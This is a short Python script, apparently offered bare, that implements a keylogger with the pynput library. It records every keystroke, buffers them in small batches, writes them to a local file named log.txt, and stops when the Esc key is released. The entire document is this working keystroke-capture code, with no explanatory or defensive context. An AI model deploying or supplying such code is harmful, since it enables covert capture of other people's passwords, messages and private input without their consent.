import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

flag = 0

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1

    if count > 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    global flag
    if flag == 0:
        f = open('log.txt', 'w')
        flag = 1
    else:
        f = open('log.txt', 'a')

    for key in keys:
        if 'Key' in str(key):
            if key == Key.space:
                f.write(' ')
            elif key == Key.enter:
                f.write('\n')
            else:
                f.write(' |'+str(key).strip('Key.')+'| ')
        else:
            f.write(str(key).strip("'"))


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()